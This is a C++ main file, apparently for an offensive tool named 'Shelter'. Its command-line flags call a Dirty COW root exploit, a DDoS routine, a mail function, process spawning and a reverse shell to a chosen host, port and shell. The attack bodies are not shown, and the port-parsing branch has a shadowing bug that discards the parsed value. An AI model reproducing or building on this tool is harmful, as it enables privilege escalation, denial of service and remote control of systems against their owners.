#include <shelter.hpp>
#include <argh.h>
#include <string>
#include <cstdlib>

using std::string;
using std::strtoul;
using namespace argh;

int main(int argc, char* argv[])
{
    Shelter app;
    parser cmdl;
    cmdl.parse(argc, argv, parser::PREFER_PARAM_FOR_UNREG_OPTION);
    app.showBanner();

    if(cmdl["--verbose"]) app.verbose = true;
    if(cmdl["--root"]) app.dirtyCow();
    else if(cmdl["--mail"]) app.mail();
    else if(cmdl["--ddos"]) app.ddos();
    else if(cmdl["--spawn"]) {
        for(auto &param : cmdl.params()) {
            if(param.first == "s") app.spawn(param.second);
        }
    }
    else if(cmdl[{"-r", "--reverse"}]) {
        string host = "127.0.0.1", shell = "/bin/sh";
        unsigned short port = 40141;

        for(auto& param : cmdl.params()) {
            if(param.first == "h") host = param.second;
            else if(param.first == "s") shell = param.second;
            else if(param.first == "p") {
                unsigned short port;
                port = (unsigned short) strtoul(param.second.c_str(), NULL, 0);
            }
        }
        app.reverse(host, port, shell);
    }
    else {
        app.showHelp();
    }
    return 0;
}
